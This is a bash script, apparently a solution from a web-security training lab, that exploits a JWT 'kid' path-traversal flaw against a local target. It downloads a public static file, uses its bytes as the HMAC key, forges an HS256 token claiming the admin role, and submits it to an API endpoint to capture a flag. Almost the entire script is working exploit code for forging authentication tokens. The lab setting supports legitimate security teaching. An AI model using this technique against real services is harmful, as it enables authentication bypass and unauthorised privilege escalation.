#!/usr/bin/env bash
# Lab 11 — `kid` is a filename. Point it at a file whose bytes you can fetch,
# and the HMAC key becomes something you know.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9110}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab11
WORK="$(mktemp -d)"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1; rm -rf "$WORK"' EXIT

# The key must be the file's exact bytes — trailing newline included — so it
# comes out of the message store rather than off a terminal.
"$H5I" browser open "$URL/static/brand.txt" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec show res_0 --session "$SESSION" --body-to "$WORK/brand.txt" >/dev/null

FORGED="$(python3 - "$WORK/brand.txt" <<'PY'
import base64, hashlib, hmac, json, sys
key = open(sys.argv[1], "rb").read()
b64 = lambda raw: base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
part = lambda obj: b64(json.dumps(obj, separators=(",", ":")).encode())
signed = part({"alg": "HS256", "typ": "JWT", "kid": "../static/brand.txt"}) + "." + \
         part({"sub": "guest", "role": "admin"})
print(signed + "." + b64(hmac.new(key, signed.encode(), hashlib.sha256).digest()))
PY
)"

send "$SESSION" req_0 --create --set path=/api/hsm \
    --set "header.Authorization=Bearer $FORGED" | flag
